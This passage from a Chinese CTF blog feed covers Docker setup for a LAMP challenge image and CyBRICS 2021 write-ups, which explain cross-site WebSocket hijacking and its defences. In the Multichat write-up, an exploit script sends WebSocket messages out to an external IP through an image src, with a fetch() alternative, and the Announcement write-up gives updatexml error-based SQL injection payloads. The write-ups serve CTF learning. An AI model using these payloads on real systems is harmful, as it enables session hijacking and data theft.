code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dockerfile">docker <span class="hljs-keyword">run</span><span class="bash"> -it id bash</span><br></code></pre></div></td></tr></table></figure><p>进入容器</p><figure class="highlight dockerfile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dockerfile">docker exec -it &lt;容器ID&gt; /bin/bash<br></code></pre></div></td></tr></table></figure><p>运行</p><figure class="highlight dockerfile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dockerfile">docker <span class="hljs-keyword">run</span><span class="bash"> -d -p 本机端口:容器端口 &lt;镜像名&gt;</span><br></code></pre></div></td></tr></table></figure><p>拷贝</p><figure class="highlight dockerfile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dockerfile">docker cp [本地路径] [container id]:[container 路径]<br></code></pre></div></td></tr></table></figure><h2 id="配环境"><a href="#配环境" class="headerlink" title="配环境"></a>配环境</h2><p>自己安装web环境感觉好麻烦呀，看了看网上的还有别人配好的镜像</p><p><img src="https://img-blog.csdnimg.cn/db76db3bd231413fad2d8f8858a623b2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>拉了第一个看看，中途3306可能会被占用kill掉就行</p><p><code>docker pull mattrayner/lamp</code></p><p><code>docker run  --name test-lamp  -p 12345:80 -p 3306:3306  -d mattrayner/lamp</code></p><p>进去看了一下，确实比较齐全，但就是拉镜像的时候安装太慢了。但dockerfile也写的简单。</p><figure class="highlight dockerfile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dockerfile"><span class="hljs-keyword">from</span> mattrayner/lamp<br><br><span class="hljs-keyword">MAINTAINER</span> KKfine<br><br><span class="hljs-keyword">ENV</span> REFRESHED_AT <span class="hljs-number">2021</span>-<span class="hljs-number">8</span>-<span class="hljs-number">1</span><br><br><span class="hljs-keyword">ENV</span> LANG C.UTF-<span class="hljs-number">8</span><br><br><span class="hljs-keyword">ADD</span><span class="bash"> ctfweb.tar.gz /var/www/html</span><br><br><span class="hljs-keyword">COPY</span><span class="bash"> hint.php /tmp</span><br><br><span class="hljs-keyword">RUN</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;设置的flag&#x27;</span> &gt; /home/flaaag.txt &amp;&amp; rm -rf /var/www/html/* &amp;&amp; tar -zcvf ctfweb.tar.gz var/www/html</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cybrics</title>
    <link href="/2021/07/28/2021-7-28-cybrics/"/>
    <url>/2021/07/28/2021-7-28-cybrics/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Multichat"><a href="#Multichat" class="headerlink" title="Multichat"></a>Multichat</h2><p>​    题目考的是webscoket有关的漏洞，也属于是知识盲区了…</p><h3 id="关于websocket"><a href="#关于websocket" class="headerlink" title="关于websocket"></a>关于websocket</h3><h4 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h4><blockquote><p>websocket用的是ws://和 wss://，那么 WebSocket 和 HTTP 是什么关系呢。WebSocket 是 HTML5  推出的新协议，跟 HTTP 协议内容本身没有关系。WebSocket 是持久化的协议，而 HTTP  是非持久连接。WebSocket 提供了全双工沟通，俗称 Web 的 TCP 连接，但 TCP 通常处理字节流（跟消息无关），而  WebSocket 基于 TCP 实现了消息流。WebSocket 也类似于 TCP 一样进行握手连接，跟 TCP 不同的是，WebSocket 是基于 HTTP 协议进行的握手。</p></blockquote><p>看一个请求报文</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">GET ws:<span class="hljs-comment">//echo.websocket.org/?encoding=text HTTP/1.1</span><br>Host: echo.websocket.org<br>Connection: Upgrade<br>Pragma: no-cache<br>Cache-Control: no-cache<br>Upgrade: websocket<br>Origin: http:<span class="hljs-comment">//www.websocket.org</span><br>Sec-WebSocket-Version: <span class="hljs-number">13</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10_11_4</span>) Chrome/<span class="hljs-number">49.0</span><span class="hljs-number">.2623</span><span class="hljs-number">.110</span><br>Accept-Encoding: gzip, deflate, sdch<br>Accept-Language: en-US,en;q=<span class="hljs-number">0.8</span>,zh-CN;q=<span class="hljs-number">0.6</span><br>Cookie: _gat=<span class="hljs-number">1</span>; _ga=GA1<span class="hljs-number">.2</span><span class="hljs-number">.2904372</span><span class="hljs-number">.1459647651</span>; JSESSIONID=1A9431CF043F851E0356F5837845B2EC<br>Sec-WebSocket-Key: 7ARps0AjsHN8bx5dCI1KKQ==<br>Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits<br></code></pre></div></td></tr></table></figure><p>响应</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">101</span> Web Socket Protocol Handshake<br>Access-Control-Allow-Credentials: <span class="hljs-literal">true</span><br>Access-Control-Allow-Headers: content-type<br>Access-Control-Allow-Headers: authorization<br>Access-Control-Allow-Headers: x-websocket-extensions<br>Access-Control-Allow-Headers: x-websocket-version<br>Access-Control-Allow-Headers: x-websocket-protocol<br>Access-Control-Allow-Origin: http:<span class="hljs-comment">//www.websocket.org</span><br>Connection: Upgrade<br><span class="hljs-built_in">Date</span>: Sun, <span class="hljs-number">03</span> Apr <span class="hljs-number">2016</span> <span class="hljs-number">03</span>:<span class="hljs-number">09</span>:<span class="hljs-number">21</span> GMT<br>Sec-WebSocket-Accept: wW9Bl95VtfJDbpHdfivy7csOaDo=<br>Server: Kaazing Gateway<br>Upgrade: websocket<br></code></pre></div></td></tr></table></figure><p>核心在<code>Connection：Upgrade 和 Upgrade：websocket 两行。这两行相当于告诉服务器端：我要申请切换到 WebSocket 协议。</code></p><p>一旦服务器端返回 101 响应，即可完成 WebSocket 协议切换。服务器端即可以基于相同端口，将通信协议从 http://或 https://切换到 ws://或 wss://。</p><p>报文中也有和cookie类似的<code>Sec-WebSocket-Key</code>,这是一个散列key，经过了base64编码，服务器则会将一个 GUID 和这个客户端的随机数一起生成一个散列 Key 作为 Sec-WebSocket-Accept 返回给客户端。这个工作机制可以用来避免缓存代理（caching proxy），也可以用来避免请求重播（request replay）。</p><p>对于<code>Access-Control-Allow-Headers</code>,以“Sec-”开头的 Header 可以避免被浏览器脚本读取到，这样攻击者就不能利用 XMLHttpRequest 伪造 WebSocket 请求来执行跨协议攻击，因为 XMLHttpRequest 接口不允许设置 Sec-开头的 Header。</p><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><p>支持双向通信，实时性更强。</p><p>更好的二进制支持。</p><p>较少的控制开销。连接创建后，ws客户端、服务端进行数据交换时，协议控制的数据包头部较小。在不包含头部的情况下，服务端到客户端的包头只有2~10字节(取决于数据包长度)，客户端到服务端的话，需要加上额外4字节的掩码。而HTTP协议每次通信都需要携带完整的头部。</p><p>支持扩展。ws协议定义了扩展，用户可以扩展协议，或者实现自定义的子协议。(比如支持自定义压缩算法等)</p><h3 id="跨站点-WebSocket-劫持漏洞原理"><a href="#跨站点-WebSocket-劫持漏洞原理" class="headerlink" title="跨站点 WebSocket 劫持漏洞原理"></a>跨站点 WebSocket 劫持漏洞原理</h3><p>看了对于这个的介绍，感觉和CSRF确实有些像，但又有些根本上的区别，CSRF只是通过恶意网站或者其他方法伪造客户进行请求，不会导致信息泄漏问题，也不会窃听到整个消息通道和修改服务器数据。</p><h4 id="什么是跨站点-WebSocket-劫持漏洞"><a href="#什么是跨站点-WebSocket-劫持漏洞" class="headerlink" title="什么是跨站点 WebSocket 劫持漏洞"></a>什么是跨站点 WebSocket 劫持漏洞</h4><p>看看上面的报文，可以发现Cookie 头部把域名下的 Cookie 都发送到服务器端。其实WebSocket协议并没有规定服务器在握手时应该如何确认客户端的身份，服务器可以采用任何 HTTP 服务器的客户端身份认证机制，譬如 cookie，HTTP 基础认证，TLS 身份认证等。看到这，都可以联想到CSRF来绕过身份认证获得握手，其实大致过程也和CSRF差不多。</p><blockquote><p>因为 WebSocket 的客户端不仅仅局限于浏览器，因此 WebSocket 规范没有规范 Origin 必须相同（有兴趣的读者可以阅读规范  10.2 章节了解对于 Origin 的规范）。所有的浏览器都会发送 Origin 请求头，如果服务器端没有针对 Origin  头部进行验证可能会导致跨站点 WebSocket  劫持攻击。譬如，某个用户已经登录了应用程序，如果他被诱骗访问某个社交网站的恶意网页，恶意网页在某元素中植入一个 WebSocket  握手请求申请跟目标应用建立 WebSocket 连接。一旦打开该恶意网页，则自动发起如下请求。请注意，Origin 和  Sec-WebSocket-Key 都是由浏览器自动生成，Cookie  等身份认证参数也都是由浏览器自动上传到目标应用服务器端。如果服务器端疏于检查 Origin，该请求则会成功握手切换到 WebSocket  协议，恶意网页就可以成功绕过身份认证连接到 WebSocket  服务器，进而窃取到服务器端发来的信息，抑或发送伪造信息到服务器端篡改服务器端数据。</p></blockquote><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><blockquote><p>WebSocket 令牌机制</p></blockquote><p>以上看起来很美好，但是仅仅检查 Origin 远远不够，别忘记了，如果 WebSocket  的客户端不是浏览器，非浏览器的客户端发来的请求根本就没有 Origin。除此之外，我们要记得，恶意网页是可以伪造 Origin  头信息的。更彻底的解决方案还是要借鉴 CSRF 的解决方案－令牌机制。</p><p> 鉴于篇幅原因，笔者就不详细贴出整个设计和代码，建议读者参照以下概要设计提高 WebSocket 应用的安全。</p><p> \1. 服务器端为每个 WebSocket 客户端生成唯一的一次性 Token；</p><p> \2. 客户端将 Token 作为 WebSocket 连接 URL 的参数（譬如 ws://echo.websocket.org/?token＝randomOneTimeToken），发送到服务器端进行 WebSocket 握手连接；</p><p> \3. 服务器端验证 Token 是否正确，一旦正确则将这个 Token 标示为废弃不再重用，同时确认 WebSocket 握手连接成功；如果 Token 验证失败或者身份认证失败，则返回 403 错误。</p><p> 这个方案里的 Token 设计是关键，笔者推荐的方案是为登录用户生成一个 Secure Random 存储在 Session  中，然后利用对称加密（譬如 AES GCM）加密这个 Secure Random 值作为令牌，将加密后的令牌发送给客户端用来进行连接。这样每个  Session 有一个唯一的随机数，每个随机数可以通过对称加密生成若干份一次性令牌。用户即便通过不同终端通过 WebSocket  连接到服务器，服务器可以在保障令牌唯一且一次性使用的前提下，依然能将不同通道中的信息关联到同一用户中。</p><p> 可能存在另外一个设计思路，在 WebSocket 消息中增加令牌和身份信息，但笔者觉得这样的设计有悖于 WebSocket 的设计思想，而且增加了不必要的网络负载。抛砖引玉，欢迎读者提供更好的设计方案。</p><p>参考</p><p><a href="https://blog.csdn.net/hsany330/article/details/49823495?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-4.base&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-4.base">https://blog.csdn.net/hsany330/article/details/49823495?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-4.base&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-4.base</a></p><p><a href="https://blog.csdn.net/cuixiping/article/details/70048611">https://blog.csdn.net/cuixiping/article/details/70048611</a></p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>进入就是一个聊天框，也比较符合WebSocket正常的功能。F12先看一眼，看到了一串javascript脚本</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> conn;<br><span class="hljs-keyword">var</span> sended_message = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getRandomInt</span>(<span class="hljs-params">min, max</span>) </span>&#123;<br>    min = <span class="hljs-built_in">Math</span>.ceil(min);<br>    max = <span class="hljs-built_in">Math</span>.floor(max);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random() * (max - min) + min); <span class="hljs-comment">//The maximum is exclusive and the minimum is inclusive</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">appendLog</span>(<span class="hljs-params">item</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> escaped = $(<span class="hljs-string">&quot;&lt;div&gt;&quot;</span>).text(item).html();<br>    <span class="hljs-keyword">if</span> (item === sended_message) &#123;<br>        log.innerHTML += <span class="hljs-string">&#x27;&lt;div class=&quot;chat-message-right pb-4&quot;&gt;&lt;div class=&quot;flex-shrink-1 bg-light rounded py-2 px-3 mr-3&quot;&gt;&lt;div class=&quot;font-weight-bold mb-1&quot;&gt;You&lt;/div&gt;&#x27;</span> +<br>            escaped + <span class="hljs-string">&#x27;&lt;/div&gt;&lt;/div&gt;&#x27;</span>;<br>        sended_message = <span class="hljs-string">&quot;&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        log.innerHTML += <span class="hljs-string">&#x27;&lt;div class=&quot;chat-message-left pb-4&quot;&gt;&lt;div class=&quot;flex-shrink-1 bg-light rounded py-2 px-3 mr-3&quot;&gt;&#x27;</span> +<br>            escaped + <span class="hljs-string">&#x27;&lt;/div&gt;&lt;/div&gt;&#x27;</span>;<br>    &#125;<br>    log.scrollTop = log.scrollHeight;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">let</span> room = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;room&quot;</span>).value;<br>    <span class="hljs-built_in">document</span>.cookie = <span class="hljs-string">&#x27;room=&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(room);<br>    $(<span class="hljs-string">&quot;form input&quot;</span>).prop( <span class="hljs-string">&quot;disabled&quot;</span>, <span class="hljs-literal">false</span> );<br>    $(<span class="hljs-string">&quot;#room&quot;</span>).hide();<br>    $(<span class="hljs-string">&quot;#room&quot;</span>).parent().children().first().text(<span class="hljs-string">&quot;Room &quot;</span> + room);<br><br>    $(<span class="hljs-string">&quot;#connectButton&quot;</span>).hide();<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">window</span>[<span class="hljs-string">&quot;WebSocket&quot;</span>]) &#123;<br>        conn = <span class="hljs-keyword">new</span> WebSocket(<span class="hljs-string">&quot;ws://multichat-cybrics2021.ctf.su/ws&quot;</span>);<br>        conn.onclose = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">evt</span>) </span>&#123;<br>            <span class="hljs-keyword">var</span> item = <span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-keyword">if</span> (evt.code === <span class="hljs-number">1003</span>) &#123;<br>                item = <span class="hljs-string">`Status: <span class="hljs-subst">$&#123;evt.reason&#125;</span>`</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                item = <span class="hljs-string">&quot;Connection closed.&quot;</span>;<br>            &#125;<br>            appendLog(item);<br>        &#125;;<br>        conn.onopen = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">evt</span>) </span>&#123;<br>            appendLog(<span class="hljs-string">&quot;Connected&quot;</span>);<br>        &#125;;<br>        conn.onmessage = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">evt</span>) </span>&#123;<br>            appendLog(evt.data);<br>        &#125;;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        appendLog(<span class="hljs-string">&quot;Your browser does not support WebSockets.&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-built_in">window</span>.onload = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> room = getRandomInt(<span class="hljs-number">1000</span>, <span class="hljs-number">9999999999</span>);<br>    <span class="hljs-keyword">var</span> msg = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;msg&quot;</span>);<br>    <span class="hljs-keyword">var</span> log = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;log&quot;</span>);<br><br>    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;form&quot;</span>).onsubmit = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!conn) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!msg.value) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        conn.send(msg.value);<br>        sended_message = msg.value;<br>        msg.value = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;;<br><br>    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;room&quot;</span>).value = room;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>大致过程就是 先生成了一个随机数当作房间号，然后实现了消息接收发送在前端的显示，然后实现了WebSocket连接来接受和发送消息。看题目意思最开始还觉得要找到秘密的房间号，但看到随机生成的范围就不太可能了。后面有大佬出了，看了下exp才知道咋做了。</p><p>因为题目还给了一个电话的按钮，可以访问url并且可以发送问题，按题目描述应该就是通过这个电话来伪造技术支持发送<code>Hey, i forgot the flag. Can you remind me?</code>来获取flag</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">&lt;script&gt;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">appendLog</span>(<span class="hljs-params">msg</span>)</span>&#123;<br><span class="hljs-built_in">document</span>.write(<span class="hljs-string">`&lt;img src=http://39.107.239.30:80/a=<span class="hljs-subst">$&#123;<span class="hljs-built_in">escape</span>(msg)&#125;</span>&gt;&lt;/img&gt;`</span>);<br>   <span class="hljs-comment">//还可以const logger = (a) =&gt; &#123;</span><br>        <span class="hljs-comment">//fetch(`http://39.107.239.30:80/?q=$&#123;encodeURI(a)&#125;`);</span><br>        <span class="hljs-comment">// &#125;;</span><br>&#125;<br>ws = <span class="hljs-keyword">new</span> WebSocket ( <span class="hljs-string">&quot;ws://multichat-cybrics2021.ctf.su/ws&quot;</span>);<br>    ws.onclose = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">evt</span>)</span>&#123;<br>        <span class="hljs-keyword">var</span> item = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span> (evt.code == <span class="hljs-number">1003</span>)&#123;<br>            item = <span class="hljs-string">`status: <span class="hljs-subst">$&#123;evt.reason&#125;</span>`</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            item = <span class="hljs-string">&quot;Connection closed.&quot;</span>;<br>        &#125;<br>        appendLog(item);<br>    &#125;;<br>ws.onopen = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">evt</span>)</span>&#123;<br>        appendLog (<span class="hljs-string">&quot;Connected&quot;</span>);          <br>ws.send( <span class="hljs-string">&quot;Hey, i forgot the flag. Can you remind me?&quot;</span>);<br>    &#125;;<br>    ws.onmessage = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">evt</span>) </span>&#123;<br>    appendLog(evt.data)<br>    &#125;;<br>&lt;/script&gt;<br><br></code></pre></div></td></tr></table></figure><p>然后在自己vps上挂上exp，用电话访问即可。</p><p><img src="https://img-blog.csdnimg.cn/12c3f57885114411bfe1c4bf702f5ce7.png" alt="在这里插入图片描述"></p><p>现在感觉对于一些漏洞的学习，还是得注重理解原理而不是仅仅把题做出来，回头再看CSRF得漏洞等，发现以前对它得理解还是太浅了，结合WebSocket现在感觉理解更深了，对于用户身份得伪造是一个核心问题，任何漏洞都有着核心的利用思想，这个思想也可以用到其他得地方，应该多注重这些思想得积累，以后在看到某些协议或者可利用漏洞时，应注重思考这些漏洞的思想在哪，融会贯通才是最重要的。</p><p>今天再接着看看强网杯hardxss的预期解。</p><h2 id="adnetwork"><a href="#adnetwork" class="headerlink" title="adnetwork"></a>adnetwork</h2><p>1337个重定向，直接脚本request一下就行，当时浏览器运气好都跑出来了。也就只会做这个题了。</p><h2 id="Announcemen"><a href="#Announcemen" class="headerlink" title="Announcemen"></a>Announcemen</h2><p>报错注入，抓包发现还要对email进行md5基本语句如下：</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">#<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span><br>table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;announcement&#x27;</span><br><br> #<span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span><br>table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;logs&#x27;</span><br><br> #&quot;&#x27; or updatexml(1,concat(0x7e,(select group_concat(log) from logs)),0) or&#x27;&quot;<br></code></pre></div></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><p>感觉misc也挺好玩的，没怎么了解misc，暑假趁着学学misc</p><h2 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h2><p>前面几张图可以盲猜，到最后一张是一张二维码，需要分帧gif拼图，</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>im = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;640.gif&#x27;</span>)<br><span class="hljs-comment"># p = []</span><br><span class="hljs-comment"># for i in range(9,88,3):</span><br><span class="hljs-comment">#     p.append(i)</span><br>flag = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>,(<span class="hljs-number">1080</span>, <span class="hljs-number">1080</span>), <span class="hljs-string">&quot;#FFFFFF&quot;</span>)<br>p = [<span class="hljs-number">9</span>, <span class="hljs-number">12</span>, <span class="hljs-number">15</span>, <span class="hljs-number">18</span>, <span class="hljs-number">21</span>, <span class="hljs-number">24</span>, <span class="hljs-number">27</span>, <span class="hljs-number">30</span>, <span class="hljs-number">33</span>, <span class="hljs-number">36</span>, <span class="hljs-number">39</span>, <span class="hljs-number">42</span>, <span class="hljs-number">45</span>, <span class="hljs-number">48</span>, <span class="hljs-number">51</span>, <span class="hljs-number">54</span>, <span class="hljs-number">57</span>, <span class="hljs-number">60</span>, <span class="hljs-number">63</span>, <span class="hljs-number">66</span>, <span class="hljs-number">69</span>, <span class="hljs-number">72</span>, <span class="hljs-number">75</span>, <span class="hljs-number">78</span>, <span class="hljs-number">81</span>, <span class="hljs-number">84</span>, <span class="hljs-number">87</span>]<br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> p:<br>    demo = <span class="hljs-string">&#x27;demo/&#x27;</span> + <span class="hljs-string">&#x27;640-&#x27;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;.png&#x27;</span><br>    frame = Image.<span class="hljs-built_in">open</span>(demo)<br>    box = (<span class="hljs-number">0</span>, <span class="hljs-number">496</span>, <span class="hljs-number">1080</span>, <span class="hljs-number">517</span>)<br>    re = frame.crop(box)<br>    flag.paste(re,(<span class="hljs-number">0</span>,c*<span class="hljs-number">21</span>))<br>    c+=<span class="hljs-number">1</span><br>flag.show()<br><br></code></pre></div></td></tr></table></figure><p>Image模块参考<a 